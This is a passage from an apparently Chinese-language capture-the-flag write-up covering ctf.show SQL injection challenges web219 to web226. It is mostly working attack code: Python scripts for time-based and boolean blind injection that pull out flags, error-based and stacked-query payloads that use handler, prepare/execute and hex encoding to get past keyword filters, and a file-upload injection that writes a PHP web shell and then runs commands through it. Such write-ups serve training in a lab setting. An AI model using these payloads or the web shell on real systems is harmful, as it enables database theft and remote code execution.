# 爆破过程
for i in range(1, max_len + 1):
    found = False  # 标记是否找到字符
    for x in flagstr:
        # 构造 payload
        payload = f&amp;quot;if(substr((&amp;#123;query&amp;#125;),&amp;#123;i&amp;#125;,1)=&amp;#39;&amp;#123;x&amp;#125;&amp;#39;,(select count(*) from information_schema.columns A,information_schema.columns B),1)&amp;quot;

        data = &amp;#123;&amp;#39;ip&amp;#39;: payload, &amp;#39;debug&amp;#39;: 1&amp;#125;  # 将 payload 放入 data 参数

        try:
            # 发送 POST 请求
            res = requests.post(url=url, data=data, timeout=timeout)
        except requests.exceptions.RequestException:
            flag += x  # 如果超时则认为是正确字符
            found = True  # 找到正确字符

            # 输出当前进度
            print(f&amp;quot;[+] 当前进度: &amp;#123;flag&amp;#125;&amp;quot;)
            break

    if not found:
        print(&amp;quot;[*] 爆破结束&amp;quot;)
        break

# 输出最终结果
print(f&amp;quot;\n最终结果: &amp;#123;flag&amp;#125;&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web220&#34;&gt;&lt;a href=&#34;#web220&#34; class=&#34;headerlink&#34; title=&#34;web220&#34;&gt;&lt;/a&gt;web220&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;开始基于时间盲注


查询语句
       where id = ($id);


返回逻辑
//屏蔽危险分子
function waf($str)&amp;#123;
        return preg_match(&amp;#39;/sleep|benchmark|rlike|ascii|hex|concat_ws|concat|mid|substr/i&amp;#39;,$str);
    &amp;#125; 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;substr&lt;/code&gt; 用 &lt;code&gt;left&lt;/code&gt; 代替&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;LEFT()&lt;/code&gt; 字符串函数&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;作用：从一个字符串的左边取指定长度的子串。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;语法：&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;LEFT(str, length)
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;str&lt;/code&gt;：要截取的字符串。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;length&lt;/code&gt;：要截取的字符数。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查看flag&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250831233723349.png&#34; alt=&#34;image-20250831233723349&#34; style=&#34;zoom: 33%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import requests
import time
url = &amp;quot;http://dde5416a-2b12-45b3-92e2-a8eb1b3d91c6.challenge.ctf.show/api/&amp;quot;

strr = &amp;quot;0123456789abcdefghijklmnopqrstuvwxyz&amp;#123;&amp;#125;-_,&amp;quot;

# payload = &amp;quot;select table_name from information_schema.tables where table_schema=database() limit 0,1&amp;quot;

# payload = &amp;quot;select column_name from information_schema.columns where table_name=&amp;#39;ctfshow_flagxcac&amp;#39; limit 1,1&amp;quot;

payload = &amp;quot;select flagaabcc from ctfshow_flagxcac&amp;quot;

j = 1
res = &amp;quot;&amp;quot;
while 1:
    print(&amp;quot;------------------------&amp;quot;)
    print(j)
    for i in strr:
        res += i
        data = &amp;#123;
            &amp;#39;ip&amp;#39;: f&amp;quot;1) or if(left((&amp;#123;payload&amp;#125;),&amp;#123;j&amp;#125;) = &amp;#39;&amp;#123;res&amp;#125;&amp;#39;,(select count(*) FROM information_schema.tables A, information_schema.schemata B, information_schema.schemata D, information_schema.schemata E, information_schema.schemata F,information_schema.schemata G, information_schema.schemata H,information_schema.schemata I),1&amp;quot;,
            &amp;#39;debug&amp;#39;: &amp;#39;1&amp;#39;
        &amp;#125;
        try:
            r = requests.post(url, data=data, timeout=3)
            time.sleep(0.2)
            res = res[:-1]
        except Exception as e:
            print(res)
            j+=1
            break
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web221&#34;&gt;&lt;a href=&#34;#web221&#34; class=&#34;headerlink&#34; title=&#34;web221&#34;&gt;&lt;/a&gt;web221&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;limit 注入


查询语句
  //分页查询
  $sql = select * from ctfshow_user limit ($page-1)*$limit,$limit;


返回逻辑
//TODO:很安全，不需要过滤
//拿到数据库名字就算你赢
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;PROCEDURE ANALYSE()&lt;/code&gt; 函数&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;基本概念&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;code&gt;PROCEDURE ANALYSE()&lt;/code&gt; 是 MySQL 提供的一个&lt;strong&gt;辅助分析工具&lt;/strong&gt;，&lt;br&gt; 作用是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;当你查询某张表时，它会对结果集进行分析；&lt;/li&gt;
&lt;li&gt;返回关于&lt;strong&gt;字段类型优化建议&lt;/strong&gt;的报告；&lt;/li&gt;
&lt;li&gt;主要用于&lt;strong&gt;数据类型优化&lt;/strong&gt;，帮助你发现是否用错了类型，或者类型选得太大。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;它不是存储过程，而是 MySQL 的一个&lt;strong&gt;内置过程&lt;/strong&gt;。&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;&lt;strong&gt;基本语法&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;SELECT * FROM 表名 PROCEDURE ANALYSE();
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;也可以带两个参数：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;SELECT * FROM 表名 PROCEDURE ANALYSE(最大元素数, 最大元素长度);
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;最大元素数&lt;/code&gt;（max_elements）：分析时最多检查多少行（默认 256）。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;最大元素长度&lt;/code&gt;（max_memory）：分析字符串时最多检查多少字节（默认 8192）。&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;&lt;strong&gt;用法示例&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;假设有一张表 &lt;code&gt;users&lt;/code&gt;：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;CREATE TABLE users (
    id INT,
    age INT,
    gender VARCHAR(10),
    email VARCHAR(100)
);

INSERT INTO users VALUES
(1, 18, &amp;#39;M&amp;#39;, &amp;#39;a@test.com&amp;#39;),
(2, 20, &amp;#39;F&amp;#39;, &amp;#39;b@test.com&amp;#39;),
(3, 25, &amp;#39;F&amp;#39;, &amp;#39;c@test.com&amp;#39;);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;执行：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;SELECT * FROM users PROCEDURE ANALYSE();
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;输出结果会像这样（不同版本格式略有差别）：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Field_name&lt;/th&gt;
&lt;th&gt;Min_value&lt;/th&gt;
&lt;th&gt;Max_value&lt;/th&gt;
&lt;th&gt;Min_length&lt;/th&gt;
&lt;th&gt;Max_length&lt;/th&gt;
&lt;th&gt;Optimal_fieldtype&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;&lt;code&gt;users.id&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;ENUM(‘1’,’2’,’3’)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;users.age&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;18&lt;/td&gt;
&lt;td&gt;25&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;TINYINT(2) UNSIGNED&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;users.gender&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;‘F’&lt;/td&gt;
&lt;td&gt;‘M’&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;ENUM(‘F’,’M’)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;users.email&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;…&lt;/td&gt;
&lt;td&gt;…&lt;/td&gt;
&lt;td&gt;9&lt;/td&gt;
&lt;td&gt;9&lt;/td&gt;
&lt;td&gt;VARCHAR(100)&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;解释：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;它会统计最小值、最大值、长度范围；&lt;/li&gt;
&lt;li&gt;然后推荐一个&lt;strong&gt;更合适的数据类型&lt;/strong&gt;（如 &lt;code&gt;age&lt;/code&gt; 其实用 &lt;code&gt;TINYINT&lt;/code&gt; 就够了，而不是 &lt;code&gt;INT&lt;/code&gt;）。&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;&lt;strong&gt;作用&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;检查表设计&lt;/strong&gt;：帮你发现某些字段类型是否过大。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;性能优化&lt;/strong&gt;：减少存储空间，提高索引效率。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;规范化设计&lt;/strong&gt;：比如发现某字段只出现几个枚举值，建议改成 &lt;code&gt;ENUM&lt;/code&gt;。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;extractvalue()&lt;/code&gt; 函数&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;EXTRACTVALUE(xml_frag, xpath_expr)
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;第一个参数&lt;/strong&gt;：必须是 &lt;strong&gt;合法的 XML 文本字符串（必须是字符串类型，不能是数字、NULL 等）&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;第二个参数&lt;/strong&gt;：必须是 &lt;strong&gt;合法的 XPath 表达式（必须是字符串，不能为空）&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;limit&lt;/code&gt; 后面可以跟两个函数，&lt;code&gt;procedure&lt;/code&gt;  和 &lt;code&gt;into&lt;/code&gt; 函数&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;union&lt;/code&gt; 语句中不允许使用 &lt;code&gt;PROCEDURE&lt;/code&gt; 子句，因此可以通过报错注入爆出数据库名称&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;0x7e&lt;/code&gt; → 这是十六进制形式，代表字符 &lt;code&gt;~&lt;/code&gt;，标识符。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;database()&lt;/code&gt; → MySQL 内置函数，返回当前数据库名。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;concat(0x7e, database())&lt;/code&gt; → 拼接成 &lt;code&gt;&amp;quot;~库名&amp;quot;&lt;/code&gt;。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;payload&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?page=1&amp;amp;limit=1 procedure analyse(extractvalue(1,concat(0x7e,database())),1)
?page=1&amp;amp;limit=1 procedure analyse(extractvalue(1,concat(0x1e,database())),1)
?page=1&amp;amp;limit=1 procedure analyse(extractvalue(1,concat(0x2e,database())),1)
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250901001703051.png&#34; alt=&#34;image-20250901001703051&#34; style=&#34;zoom: 25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web222&#34;&gt;&lt;a href=&#34;#web222&#34; class=&#34;headerlink&#34; title=&#34;web222&#34;&gt;&lt;/a&gt;web222&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;group 注入


查询语句
  //分页查询
  $sql = select * from ctfshow_user group by $username;


返回逻辑
//TODO:很安全，不需要过滤
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;可以在 &lt;code&gt;group by&lt;/code&gt; 后面拼接时间盲注&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250901214908847.png&#34; alt=&#34;image-20250901214908847&#34; style=&#34;zoom:80%;&#34; /&gt;

&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import requests

url = &amp;quot;http://c4c7715a-823e-4d36-84ef-9c80139a11a0.challenge.ctf.show/api/&amp;quot;

#payload = &amp;quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&amp;quot;

#payload = &amp;quot;select column_name from information_schema.columns where table_name=&amp;#39;ctfshow_flaga&amp;#39; limit 1,1&amp;quot;

payload = &amp;quot;select flagaabc from ctfshow_flaga&amp;quot;
res = &amp;quot;&amp;quot;
i=0
while True:
    i=i+1
    start=32
    end=127
    while start&amp;lt;end:
        mid=(start+end)&amp;gt;&amp;gt;1
        params=&amp;#123;
            &amp;#39;u&amp;#39;:f&amp;quot;1,if(ascii(substr((&amp;#123;payload&amp;#125;),&amp;#123;i&amp;#125;,1))&amp;gt;&amp;#123;mid&amp;#125;,sleep(0.1),1)&amp;quot;
        &amp;#125;
        try:
            r=requests.get(url,params=params,timeout=0.5)
            end=mid
        except Exception as e:
            start=mid+1
    if start!=32:
        res=res+chr(start)
    else:
        break
    print(res)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web223&#34;&gt;&lt;a href=&#34;#web223&#34; class=&#34;headerlink&#34; title=&#34;web223&#34;&gt;&lt;/a&gt;web223&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;group 注入


查询语句
  //分页查询
  $sql = select * from ctfshow_user group by $username;


返回逻辑
//TODO:很安全，不需要过滤
//用户名不能是数字
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;经过测试，发现正确回显包含特征字符串 “userAUTO”&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250901215937095.png&#34; alt=&#34;image-20250901215937095&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250901215955039.png&#34; alt=&#34;image-20250901215955039&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;使用上一题的脚本逻辑，利用 &lt;code&gt;True&lt;/code&gt; 绕过数字过滤即可&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250901220404420.png&#34; alt=&#34;image-20250901220404420&#34; style=&#34;zoom:80%;&#34; /&gt;

&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import requests

# 目标 URL
url = &amp;quot;http://175d306d-7f89-41f8-9b63-8a64a1026d1f.challenge.ctf.show/api/&amp;quot;


# payload = &amp;quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&amp;quot;

# payload = &amp;quot;select group_concat(column_name) from information_schema.columns where table_name=&amp;#39;ctfshow_flagas&amp;#39;&amp;quot;

payload = &amp;quot;select flagasabc from ctfshow_flagas&amp;quot;

# 保存爆破出来的结果
flag = &amp;quot;&amp;quot;
# 当前要爆破的字符位置
i = 0

# ==================== 辅助函数 ====================
def gettrue(num):
    &amp;quot;&amp;quot;&amp;quot;
    绕过过滤数字的情况，用 true 相加代替数字
    &amp;quot;&amp;quot;&amp;quot;
    res = &amp;#39;true&amp;#39;
    if num == 1:
        return res
    else:
        for i in range(num - 1):
            res += &amp;quot;+true&amp;quot;
        return res

# ==================== 主爆破逻辑 ====================
while True:
    i = i + 1  # 爆破第 i 个字符

    # ASCII 搜索范围（可打印字符 32~126）
    start = 32
    end = 127

    # 用二分法加速判断
    while start &amp;lt; end:
        mid = (start + end) &amp;gt;&amp;gt; 1  # 取中间值

        # 构造注入参数
        # if(ascii(substr(payload, i, 1)) &amp;gt; mid, username, &amp;#39;a&amp;#39;)
        # 如果大于 mid → 返回 username，页面包含 &amp;quot;userAUTO&amp;quot;
        # 否则 → 返回 &amp;#39;a&amp;#39;，页面不包含 &amp;quot;userAUTO&amp;quot;
        params = &amp;#123;
            &amp;#39;u&amp;#39;: f&amp;quot;if(ascii(substr((&amp;#123;payload&amp;#125;),&amp;#123;gettrue(i)&amp;#125;,&amp;#123;gettrue(1)&amp;#125;))&amp;gt;&amp;#123;gettrue(mid)&amp;#125;,username,&amp;#39;a&amp;#39;)&amp;quot;
        &amp;#125;

        # 发送 GET 请求
        r = requests.get(url, params=params)

        # 判断返回结果是否包含特征字符串 &amp;quot;userAUTO&amp;quot;
        if &amp;quot;userAUTO&amp;quot; in r.text:
            start = mid + 1  # ASCII 在更大范围
        else:
            end = mid         # ASCII 在更小范围

    # 如果爆破到的字符不是空格 (32)，说明爆破成功
    if start != 32:
        flag = flag + chr(start)
    else:
        break  # 爆破到空格 → 认为结束

    # 打印当前进度
    print(flag)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web224&#34;&gt;&lt;a href=&#34;#web224&#34; class=&#34;headerlink&#34; title=&#34;web224&#34;&gt;&lt;/a&gt;web224&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;访问 &lt;code&gt;靶机/robots.txt&lt;/code&gt; ，找到密码重置页面&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250901222311968.png&#34; alt=&#34;image-20250901222311968&#34; style=&#34;zoom:80%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;重置密码&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250901222449332.png&#34; alt=&#34;image-20250901222449332&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;重新登录&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250901222523739.png&#34; alt=&#34;image-20250901222523739&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;目标：往服务器写入一个 WebShell&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;C64File&lt;/code&gt;：&lt;code&gt;Commodore 64&lt;/code&gt; 的文件头&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;Client UrlCache MMF&lt;/code&gt;：Windows 的缓存文件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;*PPD-Adobe&lt;/code&gt;：Adobe 打印机描述文件（PostScript）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;&amp;quot;&amp;#39;);&lt;/code&gt; ：闭合原本的 SQL 语句字符串&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;0x3c3f3d60245f4745545b315d603f3e&lt;/code&gt; ：&lt;code&gt;&amp;lt;?=`$_GET[1]`?&amp;gt;&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;三种注入&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;ini&#34;&gt;#shell.bin
C64File &amp;quot;&amp;#39;);select 0x3c3f3d60245f4745545b315d603f3e into outfile &amp;#39;/var/www/html/1.php&amp;#39;;--+
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;ini&#34;&gt;#shell.bin
Client UrlCache MMF&amp;quot;&amp;#39;);select 0x3c3f3d60245f4745545b315d603f3e into outfile &amp;#39;/var/www/html/1.php&amp;#39;;--+
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;ini&#34;&gt;#shell.bin
*PPD-Adobe: &amp;quot;&amp;#39;);select 0x3c3f3d60245f4745545b315d603f3e into outfile &amp;#39;/var/www/html/1.php&amp;#39;;--+
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;将上面内容保存为 &lt;code&gt;.bin&lt;/code&gt; 格式文件，选择一个 &lt;code&gt;.bin&lt;/code&gt; 上传即可&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;进行rce&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;/1.php?1=ls /
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250901230751135.png&#34; alt=&#34;image-20250901230751135&#34; style=&#34;zoom:33%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;/1.php?1=cat flag
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250901230813032.png&#34; alt=&#34;image-20250901230813032&#34; style=&#34;zoom:33%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web225&#34;&gt;&lt;a href=&#34;#web225&#34; class=&#34;headerlink&#34; title=&#34;web225&#34;&gt;&lt;/a&gt;web225&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;堆叠注入提升 基础难度


查询语句
  //分页查询
  $sql = &amp;quot;select id,username,pass from ctfshow_user where username = &amp;#39;&amp;#123;$username&amp;#125;&amp;#39;;&amp;quot;;


返回逻辑
  //师傅说过滤的越多越好
if(preg_match(&amp;#39;/file|into|dump|union|select|update|delete|alter|drop|create|describe|set/i&amp;#39;,$username))&amp;#123;
    die(json_encode($ret));
  &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解一&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;handler&lt;/code&gt; 是 MySQL 的一个特殊语句，作用是直接操作&lt;strong&gt;表的存储引擎接口&lt;/strong&gt;。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;handler &amp;lt;表名&amp;gt; open;&lt;/code&gt; 表示打开一个表，准备后续操作。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在表打开后，可以用 &lt;code&gt;read&lt;/code&gt; 读取数据：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;handler &amp;lt;表名&amp;gt; read next;&lt;/code&gt; 表示读取这张表的下一条记录。&lt;br&gt;相当于：&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;SELECT * FROM ctfshow_flagasa LIMIT 1;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?username=1&amp;#39;;show tables;--+
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250901232203646.png&#34; alt=&#34;image-20250901232203646&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?username=1&amp;#39;;show columns from ctfshow_flagasa;--+
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250901232241515.png&#34; alt=&#34;image-20250901232241515&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;?username=1&amp;#39;;handler ctfshow_flagasa open;handler ctfshow_flagasa read next;--+
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250901232344076.png&#34; alt=&#34;image-20250901232344076&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解二&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;使用sql预处理语句（使用&lt;code&gt;concat()&lt;/code&gt;拼接sql语句来绕过敏感词）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;prepare&lt;/code&gt; 是 MySQL 的动态 SQL 语法，用于创建一个可执行的语句&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;execute&lt;/code&gt; 执行语句&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;?username=1&amp;#39;; prepare a from concat(&amp;#39;selec&amp;#39;,&amp;quot;t group_concat(column_name) from information_schema.columns where table_name=&amp;#39;ctfshow_flagasa&amp;#39;&amp;quot;);execute a;
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250901234409809.png&#34; alt=&#34;image-20250901234409809&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?username=1&amp;#39;; prepare a from concat(&amp;#39;selec&amp;#39;,&amp;quot;t flagas from ctfshow_flagasa&amp;quot;);execute a;
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250901234739228.png&#34; alt=&#34;image-20250901234739228&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web226&#34;&gt;&lt;a href=&#34;#web226&#34; class=&#34;headerlink&#34; title=&#34;web226&#34;&gt;&lt;/a&gt;web226&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;堆叠注入提升 中级难度


查询语句
  //分页查询
  $sql = &amp;quot;select id,username,pass from ctfshow_user where username = &amp;#39;&amp;#123;$username&amp;#125;&amp;#39;;&amp;quot;;


返回逻辑
  //师傅说过滤的越多越好
if(preg_match(&amp;#39;/file|into|dump|union|select|update|delete|alter|drop|create|describe|set|show|\(/i&amp;#39;,$username))&amp;#123;
    die(json_encode($ret));
  &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;将语句转成十六进制&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;bash&#34;&gt;select database();
--&amp;gt;
0x73656c65637420646174616261736528293b


select group_concat(table_name) from information_schema.tables where table_schema=&amp;#39;ctfshow_web&amp;#39;
--&amp;gt;
0x73656C6563742067726F75705F636F6E636174287461626C655F6E616D65292066726F6D20696E666F726D6174696F6E5F736368656D612E7461626C6573207768657265207461626C655F736368656D613D2763746673686F775F77656227


select group_concat(column_name) from information_schema.columns where table_name=&amp;#39;ctfsh_ow_flagas&amp;#39;
--&amp;gt;
